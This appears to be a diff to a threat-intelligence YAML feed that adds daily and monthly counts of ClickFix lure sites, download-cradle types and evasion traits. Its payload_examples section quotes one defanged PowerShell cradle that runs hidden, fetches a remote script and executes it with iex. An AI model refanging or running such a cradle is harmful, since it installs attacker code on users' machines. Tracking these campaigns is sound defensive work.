@@ -4,17 +4,17 @@
 
 meta:
   source: https://mhaggis.github.io/ClickGrab/
-  date_range: 2025-04-17 to 2026-06-21
-  total_reports: 526
-  total_sites_crawled: 24807
-  total_malicious: 21894
+  date_range: 2025-04-17 to 2026-06-29
+  total_reports: 534
+  total_sites_crawled: 25607
+  total_malicious: 22214
   total_domains: 3321
-  generated: '2026-06-21'
-  appended_through: '2026-06-21'
-  carson_landscape: 3441
-  carson_updated: '2026-06-21T04:00:39Z'
+  generated: '2026-06-29'
+  appended_through: '2026-06-29'
+  carson_landscape: 3636
+  carson_updated: '2026-06-29T06:31:01Z'
   carson_lure_overlap: 61
-  carson_lure_observed: 94
+  carson_lure_observed: 92
   domain_source: clickfix-domains-all-2026-06-16.xlsx
   domain_updated: '2026-06-16'
 daily:
@@ -4620,6 +4620,158 @@ daily:
     self_delete: 2
     start_sleep: 2
     hidden_window: 4
+- date: '2026-06-22'
+  total_sites: 100
+  malicious: 42
+  cradles:
+    iwr_iex: 3
+    irm_iex: 0
+    webclient: 2
+    curl: 1
+    msiexec: 0
+    vbs_wscript: 1
+    hex_xor: 0
+    inline_no_url: 1
+  evasion:
+    mixed_case: 0
+    base64: 1
+    cdn_staging: 1
+    self_delete: 2
+    start_sleep: 2
+    hidden_window: 4
+- date: '2026-06-23'
+  total_sites: 100
+  malicious: 44
+  cradles:
+    iwr_iex: 3
+    irm_iex: 0
+    webclient: 3
+    curl: 1
+    msiexec: 0
+    vbs_wscript: 1
+    hex_xor: 0
+    inline_no_url: 1
+  evasion:
+    mixed_case: 0
+    base64: 1
+    cdn_staging: 1
+    self_delete: 3
+    start_sleep: 3
+    hidden_window: 5
+- date: '2026-06-24'
+  total_sites: 100
+  malicious: 44
+  cradles:
+    iwr_iex: 3
+    irm_iex: 0
+    webclient: 3
+    curl: 1
+    msiexec: 0
+    vbs_wscript: 1
+    hex_xor: 0
+    inline_no_url: 1
+  evasion:
+    mixed_case: 0
+    base64: 1
+    cdn_staging: 1
+    self_delete: 3
+    start_sleep: 3
+    hidden_window: 5
+- date: '2026-06-25'
+  total_sites: 100
+  malicious: 38
+  cradles:
+    iwr_iex: 3
+    irm_iex: 0
+    webclient: 0
+    curl: 2
+    msiexec: 0
+    vbs_wscript: 1
+    hex_xor: 0
+    inline_no_url: 1
+  evasion:
+    mixed_case: 0
+    base64: 1
+    cdn_staging: 1
+    self_delete: 0
+    start_sleep: 0
+    hidden_window: 2
+- date: '2026-06-26'
+  total_sites: 100
+  malicious: 42
+  cradles:
+    iwr_iex: 3
+    irm_iex: 0
+    webclient: 2
+    curl: 1
+    msiexec: 0
+    vbs_wscript: 1
+    hex_xor: 0
+    inline_no_url: 1
+  evasion:
+    mixed_case: 0
+    base64: 1
+    cdn_staging: 1
+    self_delete: 2
+    start_sleep: 2
+    hidden_window: 4
+- date: '2026-06-27'
+  total_sites: 100
+  malicious: 33
+  cradles:
+    iwr_iex: 3
+    irm_iex: 0
+    webclient: 0
+    curl: 1
+    msiexec: 0
+    vbs_wscript: 1
+    hex_xor: 0
+    inline_no_url: 0
+  evasion:
+    mixed_case: 0
+    base64: 1
+    cdn_staging: 1
+    self_delete: 0
+    start_sleep: 0
+    hidden_window: 2
+- date: '2026-06-28'
+  total_sites: 100
+  malicious: 34
+  cradles:
+    iwr_iex: 3
+    irm_iex: 0
+    webclient: 0
+    curl: 2
+    msiexec: 0
+    vbs_wscript: 1
+    hex_xor: 0
+    inline_no_url: 1
+  evasion:
+    mixed_case: 0
+    base64: 1
+    cdn_staging: 1
+    self_delete: 0
+    start_sleep: 0
+    hidden_window: 2
+- date: '2026-06-29'
+  total_sites: 100
+  malicious: 43
+  cradles:
+    iwr_iex: 3
+    irm_iex: 0
+    webclient: 2
+    curl: 2
+    msiexec: 0
+    vbs_wscript: 1
+    hex_xor: 0
+    inline_no_url: 2
+  evasion:
+    mixed_case: 0
+    base64: 1
+    cdn_staging: 1
+    self_delete: 2
+    start_sleep: 2
+    hidden_window: 4
 payload_examples:
   iwr_iex:
   - date: '2025-08-14'
@@ -4662,22 +4814,22 @@ payload_examples:
   - date: '2025-10-31'
     text: cmd.exe /c start /min powershell -w hidden -nop -c "(New-Object Net.WebClient).DownloadString('hxxps://95[.]164[.]53[.]214/b.ps1') | iex"
 cradles_total:
-  iwr_iex: 2203
+  iwr_iex: 2227
   irm_iex: 89
-  webclient: 1000
-  curl: 1407
+  webclient: 1012
+  curl: 1418
   msiexec: 1027
-  vbs_wscript: 365
+  vbs_wscript: 373
   hex_xor: 70
-  inline_no_url: 683
+  inline_no_url: 691
 evasion_totals:
   mixed_case: 1697
-  base64: 10455
-  cdn_staging: 442
-  self_delete: 983
-  start_sleep: 983
-  hidden_window: 3431
-  inline_payload: 683
+  base64: 10463
+  cdn_staging: 450
+  self_delete: 995
+  start_sleep: 995
+  hidden_window: 3459
+  inline_payload: 691
 domain_monthly:
 - month: 2025-08
   n: 135
@@ -5259,24 +5411,24 @@ monthly:
     start_sleep: 46
     hidden_window: 70
 - month: 2026-06
-  total_sites: 2100
-  malicious: 876
+  total_sites: 2900
+  malicious: 1196
   cradles:
-    iwr_iex: 56
+    iwr_iex: 80
     irm_iex: 0
-    webclient: 71
-    curl: 14
+    webclient: 83
+    curl: 25
     msiexec: 0
-    vbs_wscript: 20
+    vbs_wscript: 28
     hex_xor: 0
-    inline_no_url: 24
+    inline_no_url: 32
   evasion:
     mixed_case: 0
-    base64: 19
-    cdn_staging: 19
-    self_delete: 71
-    start_sleep: 71
-    hidden_window: 109
+    base64: 27
+    cdn_staging: 27
+    self_delete: 83
+    start_sleep: 83
+    hidden_window: 137
 domain_cradles_total:
   iwr: 187
   irm: 146
